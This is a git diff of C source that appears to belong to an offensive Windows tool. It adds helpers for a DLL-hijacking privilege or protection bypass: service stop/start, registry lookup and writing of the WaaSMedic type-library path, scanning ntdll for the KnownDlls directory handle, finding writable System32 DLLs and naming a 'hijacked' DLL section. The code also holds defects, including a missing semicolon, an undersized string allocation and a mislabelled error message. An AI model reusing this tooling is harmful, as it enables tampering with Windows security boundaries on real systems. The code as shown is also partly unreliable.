@@ -121,14 +121,14 @@ BOOL check_known_dll_symbolic_link(
     HANDLE hLink = NULL;
     ULONG length = 0;
 
-    pwszLinkName = intAlloc(MAX_PATH * sizeof(WCHAR));
+    pwszLinkName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
     if (!pwszLinkName)
     {
         malloc_failed();
         goto end;
     }
 
-    pwszTargetLocal = intAlloc(MAX_PATH * sizeof(WCHAR));
+    pwszTargetLocal = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
     if (!pwszTargetLocal)
     {
         malloc_failed();
@@ -156,7 +156,7 @@ BOOL check_known_dll_symbolic_link(
 
     target.Buffer = pwszTargetLocal;
     target.Length = 0;
-    target.MaximumLength = MAX_PATH * sizeof(WCHAR);
+    target.MaximumLength = (MAX_PATH + 1) * sizeof(WCHAR);
 
     status = NtQuerySymbolicLinkObject(
         hLink,
@@ -212,4 +212,810 @@ BOOL get_file_size(
     *file_size = fsi.AllocationSize.LowPart;
 
     return TRUE;
+}
+
+BOOL query_service_status_process_by_handle(
+    IN SC_HANDLE ServiceHandle,
+    IN OUT LPSERVICE_STATUS_PROCESS ServiceStatus)
+{
+    BOOL  ret_val       = FALSE;
+    DWORD dwBytesNeeded = 0;
+
+    memset(ServiceStatus, 0, sizeof(*ServiceStatus));
+
+    ret_val = QueryServiceStatusEx(
+        ServiceHandle,
+        SC_STATUS_PROCESS_INFO,
+        (LPBYTE)ServiceStatus,
+        sizeof(*ServiceStatus),
+        &dwBytesNeeded);
+    if (!ret_val)
+    {
+        function_failed("QueryServiceStatusEx");
+    }
+
+    return ret_val;
+}
+
+BOOL get_service_handle(
+    IN LPCWSTR ServiceName,
+    IN DWORD DesiredAccess,
+    OUT LPSC_HANDLE ServiceHandle)
+{
+    BOOL                 ret_val            = FALSE;
+    SC_HANDLE            hSCM               = NULL;
+    OpenSCManagerW_t     OpenSCManagerW     = NULL;
+    OpenServiceW_t       OpenServiceW       = NULL;
+    CloseServiceHandle_t CloseServiceHandle = NULL;
+
+    OpenSCManagerW = (OpenSCManagerW_t)(ULONG_PTR)get_function_address(
+        get_library_address(ADVAPI32_DLL, TRUE),
+        OpenSCManagerW_SW2_HASH,
+        0);
+    if (!OpenSCManagerW)
+    {
+        api_not_found("OpenSCManagerW");
+        goto cleanup;
+    }
+
+    OpenServiceW = (OpenServiceW_t)(ULONG_PTR)get_function_address(
+        get_library_address(ADVAPI32_DLL, TRUE),
+        OpenServiceW_SW2_HASH,
+        0);
+    if (!OpenServiceW)
+    {
+        api_not_found("OpenServiceW");
+        goto cleanup;
+    }
+
+    CloseServiceHandle = (CloseServiceHandle_t)(ULONG_PTR)get_function_address(
+        get_library_address(ADVAPI32_DLL, TRUE),
+        CloseServiceHandle_SW2_HASH,
+        0);
+    if (!CloseServiceHandle)
+    {
+        api_not_found("CloseServiceHandle");
+        goto cleanup;
+    }
+
+    *ServiceHandle = NULL;
+
+    hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
+    if (!hSCM)
+    {
+        function_failed("OpenSCManagerW");
+        goto cleanup;
+    }
+
+    *ServiceHandle = OpenServiceW(hSCM, ServiceName, DesiredAccess);
+    if (!*ServiceHandle)
+    {
+        function_failed("OpenSCManagerW");
+        goto cleanup;
+    }
+    
+    ret_val = TRUE;
+
+cleanup:
+    if (hSCM)
+        CloseServiceHandle(hSCM);
+
+    return ret_val;
+}
+
+BOOL query_service_status_process_by_name(
+    IN LPCWSTR ServiceName,
+    IN OUT LPSERVICE_STATUS_PROCESS ServiceStatus)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+    SC_HANDLE hService = NULL;
+
+    success = get_service_handle(ServiceName, SERVICE_QUERY_STATUS, &hService);
+    if (!success)
+        goto cleanup;
+
+    success = query_service_status_process_by_handle(hService, ServiceStatus);
+    if (!success)
+        goto cleanup;
+
+    ret_val = TRUE;
+
+cleanup:
+    if (hService) CloseServiceHandle(hService);
+
+    return ret_val;
+}
+
+BOOL get_service_status_by_name(
+    IN LPCWSTR ServiceName,
+    OUT LPDWORD Status)
+{
+    BOOL ret_val = FALSE;
+    SERVICE_STATUS_PROCESS ssp;
+
+    *Status = 0;
+
+    ret_val = query_service_status_process_by_name(ServiceName, &ssp);
+    *Status = ssp.dwCurrentState;
+
+    if (ret_val)
+    {
+        DPRINT("State of service with name '%ls': %ld", ServiceName, *Status);
+    }
+
+    return ret_val;
+}
+
+// https://docs.microsoft.com/en-us/windows/win32/services/stopping-a-service
+BOOL stop_service_by_name(
+    IN LPCWSTR ServiceName,
+    IN BOOL Wait)
+{
+    BOOL                   ret_val        = FALSE;
+    BOOL                   success        = FALSE;
+    SC_HANDLE              hService       = NULL;
+    SERVICE_STATUS_PROCESS ssp            = { 0 };
+    DWORD64                dwStartTime    = 0;
+    DWORD                  dwWaitTime     = 0;
+    GetTickCount64_t       GetTickCount64 = NULL;
+
+    GetTickCount64 = (GetTickCount64_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetTickCount64_SW2_HASH,
+        0);
+    if (!GetTickCount64)
+    {
+        api_not_found("GetTickCount64");
+        goto cleanup;
+    }
+
+    // TODO: add dinvoke: ControlService, Sleep
+
+    dwStartTime = GetTickCount64();
+
+    success = get_service_handle(ServiceName, SERVICE_QUERY_STATUS | SERVICE_STOP, &hService);
+    if (!success)
+        goto cleanup;
+
+    success = ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
+    if (!success)
+        goto cleanup;
+
+    success = query_service_status_process_by_handle(hService, &ssp);
+    if (!success)
+        goto cleanup;
+
+    if (Wait)
+    {
+        DPRINT("Stopping service %ls...", ServiceName);
+
+        while (ssp.dwCurrentState != SERVICE_STOPPED)
+        {
+            dwWaitTime = ssp.dwWaitHint / 10;
+
+            if (dwWaitTime < 1000)
+                dwWaitTime = 1000;
+            else if (dwWaitTime > 10000)
+                dwWaitTime = 10000;
+
+            Sleep(dwWaitTime);
+
+            if (!query_service_status_process_by_handle(hService, &ssp))
+                break;
+
+            if (GetTickCount64() - dwStartTime > TIMEOUT)
+            {
+                break;
+            }
+        }
+
+        ret_val = ssp.dwCurrentState == SERVICE_STOPPED;
+    }
+    else
+    {
+        ret_val = TRUE;
+    }
+
+cleanup:
+    if (hService) CloseServiceHandle(hService);
+
+    if (!ret_val)
+        DPRINT_ERR("Failed to stop service %ls.", ServiceName);
+
+    return ret_val;
+}
+
+// https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service
+BOOL start_service_by_name(
+    IN LPCWSTR ServiceName,
+    IN BOOL Wait)
+{
+    BOOL                   ret_val        = FALSE;
+    BOOL                   success        = FALSE;
+    SC_HANDLE              hService       = NULL;
+    SERVICE_STATUS_PROCESS ssp            = { 0 };
+    DWORD64                dwStartTime    = 0;
+    DWORD                  dwWaitTime     = 0;
+    GetTickCount64_t       GetTickCount64 = NULL;
+
+    GetTickCount64 = (GetTickCount64_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetTickCount64_SW2_HASH,
+        0);
+    if (!GetTickCount64)
+    {
+        api_not_found("GetTickCount64");
+        goto cleanup;
+    }
+
+    // TODO: add dinvoke: StartServiceW, Sleep
+
+    dwStartTime = GetTickCount64();
+
+    success = get_service_handle(ServiceName, SERVICE_QUERY_STATUS | SERVICE_START, &hService);
+    if (!success)
+        goto cleanup;
+
+    success = StartServiceW(hService, 0, NULL);
+    if (!success)
+        goto cleanup;
+
+    success = query_service_status_process_by_handle(hService, &ssp);
+    if (!success)
+        goto cleanup;
+
+    if (Wait)
+    {
+        while (ssp.dwCurrentState != SERVICE_RUNNING)
+        {
+            dwWaitTime = ssp.dwWaitHint / 10;
+
+            if (dwWaitTime < 1000)
+                dwWaitTime = 1000;
+            else if (dwWaitTime > 10000)
+                dwWaitTime = 10000;
+
+            Sleep(dwWaitTime);
+
+            if (!query_service_status_process_by_handle(hService, &ssp))
+                break;
+
+            if (GetTickCount64() - dwStartTime > TIMEOUT)
+            {
+                break;
+            }
+        }
+
+        ret_val = ssp.dwCurrentState == SERVICE_RUNNING;
+    }
+    else
+    {
+        ret_val = TRUE;
+    }
+
+cleanup:
+    if (hService) CloseServiceHandle(hService);
+
+    return ret_val;
+}
+
+BOOL get_service_process_id(
+    IN LPCWSTR ServiceName,
+    OUT LPDWORD ProcessId)
+{
+    BOOL                   ret_val = FALSE;
+    SERVICE_STATUS_PROCESS ssp     = { 0 };
+
+    *ProcessId = 0;
+
+    ret_val = query_service_status_process_by_name(ServiceName, &ssp);
+    *ProcessId = ssp.dwProcessId;
+
+    if (ret_val)
+    {
+        DPRINT("PID of service with name '%ls': %ld", ServiceName, *ProcessId);
+    }
+
+    return ret_val;
+}
+
+VOID safe_free(
+    IN PVOID* Memory)
+{
+    if (Memory && *Memory)
+    {
+        intFree(*Memory);
+        *Memory = NULL;
+    }
+}
+
+VOID safe_release(
+    IN IUnknown** Interface)
+{
+    if (Interface && *Interface)
+    {
+        (*Interface)->lpVtbl->Release((*Interface));
+        *Interface = NULL;
+    }
+}
+
+BOOL get_type_lib_reg_value_path(
+    OUT LPWSTR* TypeLibRegValuePath)
+{
+    BOOL       ret_val          = FALSE;
+    BOOL       success          = FALSE;
+    LPWSTR     pwszRegPath      = NULL;
+    LPWSTR     pwszTypeLibGuid  = NULL;
+    RPC_WSTR   InterfaceGuidStr = NULL;
+    UUID       InterfaceGuid    = IID_WAASREMEDIATIONEX;
+    RPC_STATUS rpc_status       = RPC_S_OK;
+
+    UuidToStringW_t  UuidToStringW  = NULL;
+    RpcStringFreeW_t RpcStringFreeW = NULL;
+
+    UuidToStringW = (UuidToStringW_t)(ULONG_PTR)get_function_address(
+        get_library_address(RPCRT4_DLL, TRUE),
+        UuidToStringW_SW2_HASH,
+        0);
+    if (!UuidToStringW)
+    {
+        api_not_found("UuidToStringW");
+        goto cleanup;
+    }
+
+    RpcStringFreeW = (RpcStringFreeW_t)(ULONG_PTR)get_function_address(
+        get_library_address(RPCRT4_DLL, TRUE),
+        RpcStringFreeW_SW2_HASH,
+        0);
+    if (!RpcStringFreeW)
+    {
+        api_not_found("RpcStringFreeW");
+        goto cleanup;
+    }
+
+    //
+    // HKLM\SOFTWARE\Classes\Interface\{B4C1D279-966E-44E9-A9C5-CCAF4A77023D}\TypeLib
+    //      (Default) -> {3ff1aab8-f3d8-11d4-825d-00104b3646c0}
+    // HKLM\SOFTWARE\Classes\TypeLib\{3ff1aab8-f3d8-11d4-825d-00104b3646c0}\1.0\0\Win64
+    //      (Default) -> %SystemRoot%\system32\WaaSMedicPS.dll
+    //
+
+    pwszRegPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!pwszRegPath)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    rpc_status = UuidToStringW(&InterfaceGuid, &InterfaceGuidStr);
+    if (rpc_status != RPC_S_OK)
+    {
+        function_failed("UuidToStringW");
+        goto cleanup;
+    }
+
+    swprintf_s(pwszRegPath, MAX_PATH, L"SOFTWARE\\Classes\\Interface\\{%ws}\\TypeLib", (LPWSTR)InterfaceGuidStr);
+
+    success = get_registry_string_value(HKEY_LOCAL_MACHINE, pwszRegPath, NULL, &pwszTypeLibGuid);
+    if (!success)
+        goto cleanup;
+
+    *TypeLibRegValuePath = intAlloc(MAX_PATH + 2);
+    if (!*TypeLibRegValuePath)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    swprintf_s(*TypeLibRegValuePath, MAX_PATH, L"SOFTWARE\\Classes\\TypeLib\\%ws\\1.0\\0\\Win64", pwszTypeLibGuid);
+
+    ret_val = TRUE;
+
+cleanup:
+    if (InterfaceGuidStr) RpcStringFreeW(&InterfaceGuidStr);
+    safe_free((PVOID*)&pwszTypeLibGuid);
+    safe_free((PVOID*)&pwszRegPath);
+
+    if (!ret_val && *TypeLibRegValuePath)
+    {
+        intFree(*TypeLibRegValuePath);
+        *TypeLibRegValuePath = NULL;
+    }
+
+    if (ret_val)
+    {
+        DPRINT("Path: %ls", *TypeLibRegValuePath);
+    }
+
+    return ret_val;
+}
+
+BOOL set_registry_string_value(
+    IN HKEY Key,
+    IN LPCWSTR SubKey,
+    IN LPCWSTR ValueName,
+    IN LPCWSTR ValueData)
+{
+    BOOL    ret_val    = FALSE;
+    LSTATUS status     = ERROR_SUCCESS;
+    HKEY    hKey       = NULL;
+    DWORD   dwDataSize = 0;
+
+    dwDataSize = ((DWORD)wcslen(ValueData) + 1) * sizeof(WCHAR);
+
+    status = RegOpenKeyExW(Key, SubKey, 0, KEY_SET_VALUE, &hKey);
+    if (status != ERROR_SUCCESS)
+    {
+        function_failed("RegOpenKeyExW");
+        goto cleanup;
+    }
+
+    status = RegSetValueExW(hKey, ValueName, 0, REG_SZ, (BYTE*)ValueData, dwDataSize);
+    if (status != ERROR_SUCCESS)
+    {
+        function_failed("RegSetValueExW");
+        goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+    if (hKey)
+        RegCloseKey(hKey);
+
+    if (ret_val)
+    {
+        DPRINT("Key: %ls | Value: %ls | Data: %ls", SubKey, ValueName, ValueData);
+    }
+
+    return ret_val;
+}
+
+BOOL get_registry_string_value(
+    IN HKEY Key,
+    IN LPCWSTR SubKey,
+    IN LPCWSTR ValueName,
+    OUT LPWSTR* ValueData)
+{
+    BOOL    ret_val        = FALSE;
+    LSTATUS status         = ERROR_SUCCESS;
+    HKEY    hKey           = NULL;
+    DWORD   dwDataSize     = 0;
+    LPWSTR  pwszStringData = NULL;
+
+    // TODO: add dinvoke
+
+    status = RegOpenKeyExW(Key, SubKey, 0, KEY_QUERY_VALUE, &hKey);
+    if (status != ERROR_SUCCESS)
+    {
+        function_failed("RegOpenKeyExW");
+        goto cleanup;
+    }
+
+    status = RegQueryValueExW(hKey, ValueName, NULL, NULL, NULL, &dwDataSize);
+    if (status != ERROR_SUCCESS)
+    {
+        function_failed("RegQueryValueExW");
+        goto cleanup;
+    }
+
+    pwszStringData = intAlloc(dwDataSize);
+    if (!pwszStringData)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+    
+    status = RegQueryValueExW(hKey, ValueName, NULL, NULL, (LPBYTE)pwszStringData, &dwDataSize);
+    if (status != ERROR_SUCCESS)
+    {
+        function_failed("RegQueryValueExW");
+        goto cleanup;
+    }
+    
+    *ValueData = pwszStringData;
+    ret_val = TRUE;
+
+cleanup:
+    if (!ret_val && pwszStringData) intFree(pwszStringData);
+    if (hKey) RegCloseKey(hKey);
+
+    if (ret_val)
+    {
+        DPRINT("Key: %ls | Value: %ls | Data: %ls", SubKey, ValueName, pwszStringData);
+    }
+
+    return ret_val;
+}
+
+
+BOOL generate_temp_path(
+    OUT LPWSTR* Buffer)
+{
+    BOOL   ret_val        = FALSE;
+    DWORD  dwBufferLength = MAX_PATH + 1;
+    LPWSTR pwszTempPath   = NULL;
+    DWORD  dwRet          = 0;
+    UINT   uintRet        = 0;
+
+    // TODO: add dinvoke: GetTempPathW, GetTempFileNameW
+
+    pwszTempPath = intAlloc(dwBufferLength * sizeof(WCHAR));
+    if (!pwszTempPath)
+    {
+        malloc_failed()
+        goto cleanup;
+    }
+
+    *Buffer = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!*Buffer)
+        goto cleanup;
+
+    dwRet = GetTempPathW(dwBufferLength, pwszTempPath);
+    if (!dwRet)
+    {
+        function_failed("GetTempPathW");
+        goto cleanup;
+    }
+
+    uintRet = GetTempFileNameW(pwszTempPath, L"", 0, *Buffer);
+    if (!uintRet)
+    {
+        function_failed("GetTempFileNameW");
+        goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+    safe_free((PVOID*)&pwszTempPath);
+    if (!ret_val)
+        safe_free((PVOID*)Buffer);
+
+    if (ret_val)
+    {
+        DPRINT("Temp path: %ls", *Buffer);
+    }
+
+    return ret_val;
+}
+
+BOOL get_known_dlls_handle_address(
+    IN PVOID* KnownDllDirectoryHandleAddr)
+{
+    BOOL                     ret_val                      = FALSE;
+    HMODULE                  hNtdll                       = NULL;
+    DWORD                    i                            = 0;
+    DWORD                    dwSectionSize                = 0;
+    DWORD                    dwIndex                      = 0;
+    DWORD                    dwMaxSize                    = 0x1000;
+    DWORD                    dwCurrentCode                = 0;
+    LPVOID                   pLdrGetKnownDllSectionHandle = NULL;
+    LPVOID                   pSectionAddress              = NULL;
+    LPVOID                   pKnownDllsHandleAddr         = NULL;
+    LPVOID                   pDataAddr                    = NULL;
+    PIMAGE_DOS_HEADER        DosHeader                    = NULL;
+    PIMAGE_NT_HEADERS        NtHeaders                    = NULL;
+    PIMAGE_SECTION_HEADER    SectionHeader                = NULL;
+    POBJECT_NAME_INFORMATION ObjectInfo                   = NULL;
+
+    hNtdll = get_library_address(NTDLL_DLL, TRUE);
+
+    pLdrGetKnownDllSectionHandle = get_function_address(
+        hNtdll,
+        LdrGetKnownDllSectionHandle_SW2_HASH,
+        0);
+    if (!pLdrGetKnownDllSectionHandle)
+    {
+        api_not_found("LdrGetKnownDllSectionHandle");
+        goto cleanup;
+    }
+
+
+    DosHeader     = (PIMAGE_DOS_HEADER)hNtdll;
+    NtHeaders     = RVA(PIMAGE_NT_HEADERS, hNtdll, DosHeader->e_lfanew);
+    SectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)&NtHeaders->OptionalHeader + NtHeaders->FileHeader.SizeOfOptionalHeader);
+
+    for (i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
+    {
+        if (!strcmp((char*)SectionHeader[i].Name, ".data"))
+        {
+            pSectionAddress = RVA(PULONG_PTR, hNtdll, SectionHeader[i].VirtualAddress);
+            dwSectionSize = SectionHeader[i].Misc.VirtualSize;
+            break;
+        }
+    }
+
+    if (pSectionAddress == 0 || dwSectionSize == 0)
+    {
+        DPRINT_ERR("Failed to find the .text section of ntdll");
+        goto cleanup;
+    }
+
+    ObjectInfo = intAlloc(1024);
+    if (!ObjectInfo)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    dwIndex = 0;
+    do
+    {
+        // If we reach the RET instruction, we found the end of the function.
+        if (*(PWORD)pLdrGetKnownDllSectionHandle == 0xccc3 || dwIndex >= dwMaxSize)
+            break;
+
+        // 1. Read the 4 bytes at the current position => Potential RIP relative offset.
+        // 2. Add the offset to the current position => Absolute address.
+        // 3. Check if the calculated address is in the .data section.
+        // 4. If so, we have a candidate, check if we can find the \KnownDlls handle at this address.
+        dwCurrentCode = *(PDWORD)pLdrGetKnownDllSectionHandle;
+        pDataAddr = (PBYTE)pLdrGetKnownDllSectionHandle + sizeof(dwCurrentCode) + dwCurrentCode;
+        if ((ULONG_PTR)pDataAddr >= (ULONG_PTR)pSectionAddress && (ULONG_PTR)pDataAddr < (ULONG_PTR)((PBYTE)pSectionAddress + dwSectionSize))
+        {
+            if (NT_SUCCESS(NtQueryObject_(*(LPHANDLE)pDataAddr, ObjectNameInformation, ObjectInfo, MAX_PATH, NULL)))
+            {
+                if (ObjectInfo->Name.Buffer && !wcscmp(ObjectInfo->Name.Buffer, STR_KNOWNDLLS))
+                {
+                    pKnownDllsHandleAddr = pDataAddr;
+                    break;
+                }
+            }
+        }
+
+        pLdrGetKnownDllSectionHandle = (PBYTE)pLdrGetKnownDllSectionHandle + 1;
+        dwIndex += 1;
+
+    } while (!pKnownDllsHandleAddr);
+
+    if (!pKnownDllsHandleAddr)
+        goto cleanup;
+
+    *KnownDllDirectoryHandleAddr = pKnownDllsHandleAddr;
+    ret_val = TRUE;
+
+cleanup:
+    safe_free((PVOID*)&ObjectInfo);
+
+    return ret_val;
+}
+
+VOID safe_close_handle(
+    IN PHANDLE Handle)
+{
+    if (Handle && *Handle && *Handle != INVALID_HANDLE_VALUE)
+    {
+        NtClose(*Handle);
+        *Handle = NULL;
+    }
+}
+
+BOOL find_writable_system_dll(
+    IN DWORD MinSize,
+    OUT LPWSTR* FilePath)
+{
+    BOOL             ret_val                  = FALSE;
+    BOOL             bCurrentDirectoryChanged = FALSE;
+    LPWSTR           pwszCurrentDirectory     = NULL;
+    LPWSTR           pwszSystemDirectory      = NULL;
+    LPWSTR           pwszFilePath             = NULL;
+    WIN32_FIND_DATAW wfd                      = { 0 };
+    HANDLE           hFind                    = NULL;
+    HANDLE           hFile                    = NULL;
+    DWORD            dwFileSize               = 0;
+
+    // TODO: add dinvoke
+
+    pwszCurrentDirectory = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!pwszCurrentDirectory)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    pwszSystemDirectory = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!pwszSystemDirectory)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    pwszFilePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!pwszFilePath)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    GetCurrentDirectoryW(MAX_PATH, pwszCurrentDirectory);
+    GetSystemDirectoryW(pwszSystemDirectory, MAX_PATH);
+    SetCurrentDirectoryW(pwszSystemDirectory);
+    
+    bCurrentDirectoryChanged = TRUE;
+
+    hFind = FindFirstFileW(L"*.dll", &wfd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        goto cleanup;
+
+    do
+    {
+        hFile = CreateFileW(wfd.cFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile== INVALID_HANDLE_VALUE)
+            goto loopcleanup;
+
+        dwFileSize = GetFileSize(hFile, NULL);
+
+        if (dwFileSize == INVALID_FILE_SIZE || dwFileSize < MinSize)
+            goto loopcleanup;
+
+        *FilePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+        if (!*FilePath)
+        {
+            malloc_failed();
+            goto loopcleanup;
+        }
+
+        swprintf_s(*FilePath, MAX_PATH, L"%ws\\%ws", pwszSystemDirectory, wfd.cFileName);
+        ret_val = TRUE;
+
+    loopcleanup:
+        safe_close_handle(&hFile);
+
+    } while (FindNextFileW(hFind, &wfd) && !ret_val);
+
+cleanup:
+    if (bCurrentDirectoryChanged) SetCurrentDirectoryW(pwszCurrentDirectory);
+    if (hFind && hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
+    safe_free((PVOID*)&pwszCurrentDirectory);
+    safe_free((PVOID*)&pwszSystemDirectory);
+    safe_free((PVOID*)&pwszFilePath);
+
+    if (ret_val)
+    {
+        DPRINT("File: %ls", *FilePath);
+    }
+
+    return ret_val;
+}
+
+BOOL get_hijacked_dll_name(
+    OUT LPWSTR* HijackedDllName,
+    OUT LPWSTR* HijackedDllSectionPath)
+{
+    BOOL ret_val = FALSE;
+
+    *HijackedDllName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!*HijackedDllName)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    *HijackedDllSectionPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!*HijackedDllSectionPath)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    swprintf_s(*HijackedDllName, MAX_PATH, L"%ws", STR_HIJACKED_DLL_NAME);
+    swprintf_s(*HijackedDllSectionPath, MAX_PATH, L"\\%ws\\%ws", STR_BASENAMEDOBJECTS, *HijackedDllName);
+
+    ret_val = TRUE;
+
+cleanup:
+    if (!ret_val && *HijackedDllName)
+    {
+        intFree(*HijackedDllName);
+        *HijackedDllName = NULL;
+    }
+    if (!ret_val && *HijackedDllSectionPath)
+    {
+        intFree(*HijackedDllSectionPath);
+        *HijackedDllSectionPath = NULL;
+    }
+
+    return ret_val;
 }
